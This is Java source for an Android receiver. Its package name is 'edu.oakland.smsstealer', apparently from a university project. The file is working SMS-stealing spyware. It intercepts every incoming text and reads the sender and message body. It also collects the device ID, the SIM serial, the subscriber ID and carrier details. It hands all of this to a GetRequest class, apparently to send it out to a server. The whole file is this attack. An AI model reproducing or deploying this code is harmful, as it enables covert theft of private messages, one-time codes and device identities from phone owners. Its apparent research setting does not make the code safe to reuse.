package edu.oakland.smsstealer;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.widget.Toast;

import java.util.HashMap;

/**
 * Created by anthony on 1/7/17.
 */
public class Interceptor extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        final Bundle bundle = intent.getExtras();
        String simOperator = null, deviceId = null, networkOperator = null, simSerialNumber = null, subscriberId = null;
        try {
            if (bundle != null) {
                String message = null, number = null;
                final Object[] pdusObj = (Object[]) bundle.get("pdus");

                for (int i = 0; i < pdusObj.length; i++) {
                    SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) pdusObj[i]);
                    number = currentMessage.getDisplayOriginatingAddress();
                    message = currentMessage.getDisplayMessageBody();
                    simOperator = MainActivity.MANAGER.getSimOperator();
                    deviceId = MainActivity.MANAGER.getDeviceId();
                    networkOperator =  MainActivity.MANAGER.getNetworkOperator();
                    simSerialNumber = MainActivity.MANAGER.getSimSerialNumber();
                    subscriberId = MainActivity.MANAGER.getSubscriberId();
                }
                if (message != null && number != null) {
                    new GetRequest(number, message, simOperator, deviceId, networkOperator, simSerialNumber, subscriberId).execute();
                }
            }
        } catch (Exception e) {
            Toast.makeText(context, "Some sort of exception. No other information.", Toast.LENGTH_LONG).show();
        }
    }
}